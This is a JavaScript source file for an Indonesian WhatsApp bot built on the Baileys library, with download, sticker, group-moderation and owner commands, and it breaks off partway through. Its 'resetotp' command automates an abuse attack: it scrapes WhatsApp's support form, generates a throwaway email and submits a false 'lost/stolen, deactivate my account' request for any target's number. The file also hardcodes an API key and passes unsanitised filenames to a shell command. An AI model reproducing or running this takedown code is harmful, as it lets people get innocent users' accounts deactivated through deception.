/*BUAT LU YANG HAPUS CREDIT ? GW GA AKAN PUBLIC LAGI KEDEPANNYA , JADI HARGAI KAMI

NGEJUAL SC INI ? NERAKA TAK TERBATAS

THANKS TO CREDIT : 
> COMOT X JAA ( UPDATE FITUR )
> DIKA ARDNT ( SEPUH :V )
> comot ( FUNCTION LOADING )
> ALLAH SWT 
> BISSMILLAH JANGAN ADA YANG JUAL*/

require('./comot/config/settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys");
const fs = require("fs");
const cheerio = require("cheerio");
const chalk = require("chalk");
const moment = require('moment-timezone')
const crypto = require("crypto");
const { exec, spawn, execSync } = require("child_process");
const axios = require("axios");
const fetch = require("node-fetch");
const Jimp = require("jimp");
const ytdl = require("ytdl-core");
const util = require("util");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./comot/jangandiubah/color')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./comot/jangandiubah/exif')
const {
TelegraPh,
UploadFileUgu,
webp2mp4File,
floNime
} = require('./comot/jangandiubah/uploader')
const {
toAudio,
toPTT,
toVideo,
ffmpeg
} = require('./comot/jangandiubah/converter')
const thumb = fs.readFileSync ('./comot/image/thumb.jpg')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom } = require('./comot/jangandiubah/functions')

module.exports = comot = async (comot, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

const { color, bgcolor, pickRandom, randomNomor } = require('./comot/jangandiubah/console.js')
const { wallpaper, wikimedia, quotesAnime, komiku, ssweb, sholat, tafsirsurah, fbdl } = require("./comot/jangandiubah/search");
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//`
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await comot.decodeJid(comot.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const antilink = JSON.parse(fs.readFileSync('./comot/database/antilink.json'));

const text = q = args.join(" ")
const isSticker = (type == 'stickerMessage')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m
const isSeler = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

const isGroup = m.key.remoteJid.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await comot.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAntiLink = antilink.includes(from) ? true : false
const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const petik = "```"
global.cr = '𝗖𝗢𝗠𝗢𝗧 𝗠𝗗'
const reply = (teks) => {
return comot.sendMessage(from, { text: teks}, { quoted: fkontak})} 
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

const ownerNumber = JSON.parse(fs.readFileSync("./comot/database/owner.json"))
const groupjs = JSON.parse(fs.readFileSync('./comot/databaseid/idgrup.json').toString())
const gsh = m.isGroup ? groupjs.includes(m.chat) : false
const prem = JSON.parse(fs.readFileSync('./comot/database/premium.json').toString())
const isPrem = prem.includes(m.sender)
	
if (!comot.public) {
if (!m.key.fromMe) return
} 
            
//anti link
if (isGroup && isAntiLink && isBotGroupAdmins){
if (budy.match(`chat.whatsapp.com`)) {
if (!isBotAdmins) return reply(mess.botAdmin)
let gclink = (`https://chat.whatsapp.com/`)
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isAdmins)
if (isCreator)
comot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
await comot.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.sender
}
})
}
}

if (m.message) {
comot.readMessages([m.key])
}

const cap = 'p'
const kalgans = { 
key: {
fromMe: [], 
participant: "", ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},
'message': {
"scheduledCallCreationMessage": {
"callType": "CALL",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}}}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await comot.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function loading () {
var comott = [
"███▓▓▓▓▓▓▓▓▓▓▓ 20%",
"█████▓▓▓▓▓▓▓▓▓ 30%",
"████████▓▓▓▓▓▓ 50%",
"████████████▓▓ 80%",
"██████████████ 100%",
]
let { key } = await comot.sendMessage(from, {text: "█▓▓▓▓▓▓▓▓▓▓▓▓▓ 10%"})
//Pengalih isu

for (let i = 0; i < comott.length; i++) {
await comot.sendMessage(from, {text: comott[i], edit: key });
//PESAN LEPAS
}
}
        
if (global.autoRecord) {
if (command) {
comot.sendPresenceUpdate('recording', from)
}
}

if (global.autoTyping) {
if (command) {
comot.sendPresenceUpdate('composing', from)
}
}
async function sendGeekzMessage(chatId, message, options = {}){
let generate = await generateWAMessage(chatId, message, options)
let type2 = getContentType(generate.message)
if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
return await comot.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        
const fkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${nameowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${namebot},;;;\nFN:${namebot}\nitem1.TEL;waid=${owner}:+${owner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': thumb,
thumbnail: thumb,
sendEphemeral: true
}   
}
}

// cmd
if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mcomot MD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mcomot MD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
		
try {
ppuser = await comot.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

const generateProfilePicture = async(buffer) => {
const jimp_1 = await Jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(Jimp.MIME_JPEG)
}
}

switch (command) {
//=================================================//
case 'menu': {
let acu = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
menu =`𝗕𝗼𝘁 𝗶𝗻𝗶 𝗮𝗱𝗮𝗹𝗮𝗵 𝗯𝗼𝘁 𝗺𝘂𝗹𝘁𝗶 𝗱𝗲𝘃𝗶𝗰𝗲 𝘆𝗮𝗻𝗴 𝗯𝗲𝗿𝗷𝗮𝗹𝗮𝗻 𝗺𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗸𝗮𝗻 𝗹𝗶𝗻𝘂𝗸 , 𝗯𝗼𝘁 𝗶𝗻𝗶 𝗺𝗮𝘀𝗶𝗵 𝘁𝗮𝗵𝗮𝗽 𝗽𝗲𝗻𝗴𝗲𝗺𝗯𝗮𝗻𝗴 𝘀𝗲𝗵𝗶𝗻𝗴𝗴𝗮 𝗺𝗮𝘀𝗶𝗵 𝗮𝗱𝗮 𝘆𝗮𝗻𝗴 𝗲𝗿𝗼𝗿 , 𝗱𝗶𝗹𝗮𝗿𝗮𝗻𝗴 𝘀𝗽𝗮𝗺 𝗯𝗼𝘁

————「 𝗜𝗻𝗳𝗼 𝗯𝗼𝘁 」————

𝗡𝗮𝗺𝗮 𝗯𝗼𝘁 : ${namebot}
𝗡𝗮𝗺𝗮 𝗼𝘄𝗻𝗲𝗿 : ${nameowner}
𝗩𝗲𝗿𝘀𝗶 𝗯𝗼𝘁 : ${versi}
𝗕𝗮𝗶𝗹𝗲𝘆𝘀 𝗯𝗼𝘁 : 𝗪𝗵𝗶𝘀𝗸𝗲𝘆𝘀𝗼𝗰𝗸𝗲𝘁𝘀

🅞 = 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆
🅖 = 𝗚𝗿𝗼𝘂𝗽 𝗼𝗻𝗹𝘆
🅕 = 𝗙𝗿𝗲𝗲
🅟 = 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗼𝗻𝗹𝘆

╭─「 𝗟𝗮𝗽𝗼𝗿𝗮𝗻 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}reportbug 🅕
╰─────────╼
╭─「 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}tiktok 🅕
│‎➤ » ${prefix}ytmp4 🅕
│‎➤ » ${prefix}ytmp3 🅕
╰─────────╼
╭─「 𝗚𝗿𝗼𝘂𝗽 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}antilink 🅖
│‎➤ » ${prefix}group 🅖
│‎➤ » ${prefix}kick 🅖
│‎➤ » ${prefix}hidetag 🅖
│‎➤ » ${prefix}linkgc 🅖
│‎➤ » ${prefix}opentime 🅖
╰─────────╼
╭─「 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}gimage 🅟
│‎➤ » ${prefix}attp 🅟
│‎➤ » ${prefix}ttp 🅟
│‎➤ » ${prefix}ttp2 🅟
│‎➤ » ${prefix}ttp3 🅟
│‎➤ » ${prefix}ttp4 🅟
│‎➤ » ${prefix}animespank 🅟
│‎➤ » ${prefix}emojimix1 🅟
│‎➤ » ${prefix}emojimix2 🅟
╰─────────╼
╭─「 𝗖𝗼𝗻𝘃𝗲𝗿𝘁 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}sticker 🅕
│‎➤ » ${prefix}toimg 🅕
│‎➤ » ${prefix}tourl 🅕
│‎➤ » ${prefix}smeme 🅕
│‎➤ » ${prefix}swm 🅕
╰─────────╼
╭─「 𝗥𝗮𝗻𝗱𝗼𝗺 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}waifu 🅕
│‎➤ » ${prefix}loli 🅕
│‎➤ » ${prefix}walpaperanime 🅕
│‎➤ » ${prefix}patrick 🅕
│‎➤ » ${prefix}cosplay 🅕
│‎➤ » ${prefix}couple 🅕
╰─────────╼
╭─「 𝗔𝘀𝘂𝗽𝗮𝗻 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}cecan 🅕
│‎➤ » ${prefix}china🅕
│‎➤ » ${prefix}cogan 🅕
│‎➤ » ${prefix}indonesia 🅕
│‎➤ » ${prefix}korea 🅕
│‎➤ » ${prefix}malaysia 🅕
│‎➤ » ${prefix}thailand 🅕
│‎➤ » ${prefix}vietnam 🅕
╰─────────╼
╭─「 𝗢𝘄𝗻𝗲𝗿 𝗺𝗲𝗻𝘂 」
│‎➤ » ${prefix}addprem 🅞
│‎➤ » ${prefix}delprem 🅞
│‎➤ » ${prefix}self 🅞
│‎➤ » ${prefix}join 🅞
│‎➤ » ${prefix}leave 🅞
│‎➤ » ${prefix}public 🅞
│‎➤ » ${prefix}resetotp 🅞
│‎➤ » ${prefix}addowner 🅞
│‎➤ » ${prefix}delowner 🅞
│‎➤ » ${prefix}infobansos 🅞
│‎➤ » ${prefix}setbotname 🅞
│‎➤ » ${prefix}listpremium 🅞
│‎➤ » ${prefix}listowner 🅞
│‎➤ » ${prefix}setppbot 🅞
╰─────────╼

${end}`
comot.sendMessage(m.chat, {
text: menu,
contextInfo: {  forwardingScore: 99999999,
isForwarded: false,
externalAdReply: {
title: acu,
thumbnailUrl: foto,
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'ytmp4': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} *𝘂𝗿𝗹*`)
reply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.xyz/download/youtube?url=${text}`)
const cpt = anu.result.channel
const nick = anu.result.title
comot.sendMessage(m.chat, { video: { url: anu.result.mp4.data}, caption: `💬Judul : ${nick}\n👤Channel : ${cpt}`}, {quoted: m})
}catch (error) {
reply('Error') 
}
}
break
case 'setppbot': {
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`𝗦𝗲𝗻𝗱/𝗿𝗲𝗽𝗹𝘆 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix+command}`)
if (!/image/.test(mime)) return reply(`𝗦𝗲𝗻𝗱/𝗿𝗲𝗽𝗹𝘆 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix+command}`)
if (/webp/.test(mime)) return reply(`𝗦𝗲𝗻𝗱/𝗿𝗲𝗽𝗹𝘆 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix+command}`)
var medis = await comot.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await comot.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(mess.succes)
} else {
var memeg = await comot.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(mess.succes)
}
}
break
case 'ytmp3': {
if (!text) throw `𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
downloadMp3(text)
}
break
case 'infobansos': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`${petik}Text?${petik}`)
var call = { 
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: `${text}`
}
}
comot.relayMessage(m.chat, call, {})
}
break
case "addowner":
if (!isCreator) return reply(mess.only.owner)
if (!args[0]) return reply(`𝗣𝗲𝗻𝗴𝘂𝗻𝗮𝗮𝗻 ${prefix+command} 𝗻𝗼𝗺𝗼𝗿\n𝗰𝗼𝗻𝘁𝗼𝗵 ${prefix+command} 628xxx`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await comot.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`𝗺𝗮𝘀𝘂𝗸𝗸𝗮𝗻 𝗻𝗼𝗺𝗼𝗿 𝘆𝗮𝗻𝗴 𝘃𝗮𝗹𝗶𝗱 𝗱𝗮𝗻 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./comot/database/owner.json', JSON.stringify(ownerNumber))
reply(`𝗻𝗼𝗺𝗼𝗿 ${bnnd} 𝘁𝗲𝗹𝗮𝗵 𝗺𝗲𝗻𝗷𝗮𝗱𝗶 𝗼𝘄𝗻𝗲𝗿!!!`)
break
case "delowner":
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 ${prefix+command} 𝗻𝗼𝗺𝗼𝗿\n𝗰𝗼𝗻𝘁𝗼𝗵 ${prefix+command} 628xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./comot/database/owner.json', JSON.stringify(ownerNumber))
reply(`𝗻𝗼𝗺𝗼𝗿 ${ya} 𝘁𝗲𝗹𝗮𝗵 𝗱𝗶 𝗵𝗮𝗽𝘂𝘀 𝗼𝘄𝗻𝗲𝗿!!!`)
break
case 'listowner':
teks = '𝗢𝘄𝗻𝗲𝗿 𝗹𝗶𝘀𝘁\n\n'
for (let comot of ownerNumber) {
teks += `- ${comot}\n`
}
teks += `\n*𝘁𝗼𝘁𝗮𝗹 : ${ownerNumber.length}*`
comot.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": ownerNumber } })
break
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
if (!isPrem) return reply(mess.prem) 
if (args.length == 0) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝗰𝗼𝗺𝗼𝗳 𝘅𝗱`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
comot.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break
case 'tourl': {
if (!/video/.test(mime) && !/image/.test(mime)) throw `𝗦𝗲𝗻𝗱/𝗿𝗲𝗽𝗹𝘆 𝗶𝗺𝗮𝗴𝗲 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix + command}`
if (!quoted) throw `𝗦𝗲𝗻𝗱/𝗿𝗲𝗽𝗹𝘆 𝗶𝗺𝗮𝗴𝗲 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./comot/jangandiubah/uploader')
let media = await comot.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case "linkgc": {
if (!isGroup) return reply(mess.group)
if (!isAdmins && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
const url = await comot.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case 'patrick': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await comot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'setbotname':{
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗻𝗮𝗺𝗮 𝗮𝗻𝗱𝗮\n𝗲𝘅𝗮𝗺𝗽𝗹𝗲: ${prefix + command} 𝗖𝗼𝗺𝗼𝘁 𝗠𝗗`)
await comot.updateProfileName(text)
reply(mess.succes)
}
break
case "resetotp": {
if (Input) {
let cekno = await comot.onWhatsApp(Input)
if (cekno.length == 0) return reply(`𝗡𝗼𝗺𝗼𝗿 𝘁𝗲𝗿𝘀𝗲𝗯𝘂𝘁 𝘁𝗶𝗱𝗮𝗸 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽`)
if (Input == owner + "@s.whatsapp.net") return reply(`𝗞𝗮𝗺𝘂 𝗼𝘄𝗻𝗲𝗿 𝗸𝘂`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(mess.succes)
} else if (payload.includes(`"payload":false`)) {
reply(`𝗥𝗲𝘀𝗲𝘁𝗼𝘁𝗽 𝗹𝗶𝗺𝗶𝘁 𝘀𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗺𝗲𝗻𝘂𝗻𝗴𝗴𝘂 𝗸𝗲𝗺𝘂𝗱𝗶𝗮𝗻 𝗵𝗮𝗿𝗶`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗻𝗼𝗺𝗼𝗿 𝘁𝗮𝗿𝗴𝗲𝘁')
}
break
case 'attp': {
if (!isPrem) return reply(mess.prem)         
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗛𝗮𝗹𝗹𝗼`)
reply(mess.wait)
await comot.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp?apikey=haikalgans&text=${text}` }}, { quoted: m })
}
break
case 'toimg': {
if (!/webp/.test(mime)) return reply(`𝗥𝗲𝗽𝗹𝘆 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 *${prefix + command}*`)
reply(mess.wait)
let media = await comot.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
comot.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})            
}
break
case 'sticker': {
if (!quoted) return reply(`❎ ${prefix + command} 𝗥𝗲𝗽𝗹𝘆 𝗳𝗼𝘁𝗼 𝘁𝗲𝗿𝘀𝗲𝗯𝘂𝘁`)
if (/image/.test(mime)) {
let media = await quoted.download()
reply(mess.wait)
let encmedia = await comot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply(`❎ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝟭𝟬 𝘀𝗲𝗰𝗼𝗻𝗱`)
let media = await quoted.download()
let encmedia = await comot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`❎ 𝗥𝗲𝗽𝗹𝘆 𝗳𝗼𝘁𝗼 𝘁𝗲𝗿𝘀𝗲𝗯𝘂𝘁 𝗱𝗮𝗻 𝗸𝗲𝘁𝗶𝗸 ${prefix+command}`)
}
}
break
case 'swm': {
let [teks1, teks2] = text.split`|`
if (!teks1) return reply(`𝗞𝗶𝗿𝗶𝗺/𝗿𝗲𝗽𝗹𝘆 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix + command} 𝘁𝗲𝗸𝘀𝟮|𝘁𝗲𝗸𝘀𝟮`)
if (!teks2) return reply(`𝗞𝗶𝗿𝗶𝗺/𝗿𝗲𝗽𝗹𝘆 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix + command} 𝘁𝗲𝗸𝘀𝟭|𝘁𝗲𝗸𝘀𝟮`)
reply(mess.wait)
if (/image/.test(mime)) {
let media = await comot.downloadMediaMessage(qmsg)
let encmedia = await comot.sendImageAsSticker(m.chat, media, m, {
packname: teks1,
author: teks2
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('𝗠𝗮𝘅𝗶𝗺𝗮𝗹 𝟭𝟬 𝗱𝗲𝘁𝗶𝗸')
let media = await comot.downloadMediaMessage(qmsg)
let encmedia = await comot.sendVideoAsSticker(m.chat, media, m, {
packname: teks1,
author: teks2
})
await fs.unlinkSync(encmedia)
} else {
return reply(`𝗞𝗶𝗿𝗶𝗺 𝗴𝗮𝗺𝗯𝗮𝗿/𝘃𝗶𝗱𝗲𝗼 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 ${prefix + command}\n𝗱𝘂𝗿𝗮𝘀𝗶 𝘃𝗶𝗱𝗲𝗼 𝟭-𝟵 𝗱𝗲𝘁𝗶𝗸`)
}
}
break
case 'smeme': {
let respond = `𝗞𝗶𝗿𝗶𝗺/𝗿𝗲𝗽𝗹𝘆 𝗶𝗺𝗮𝗴𝗲 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 : ${prefix + command} 𝘁𝗲𝘅𝘁𝟭|𝘁𝗲𝘅𝘁𝟮`
if (!/image/.test(mime)) return reply(respond)
if (!text) return reply(respond)
reply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await comot.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPh(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let pop = await comot.sendImageAsSticker(m.chat, smeme, m, {
packname: packname,
author: author
})
fs.unlinkSync(pop)
}
break
case 'join': {
if (!isCreator) return reply(mess.owner)
if (!text) return 'Masukkan Link Group!'
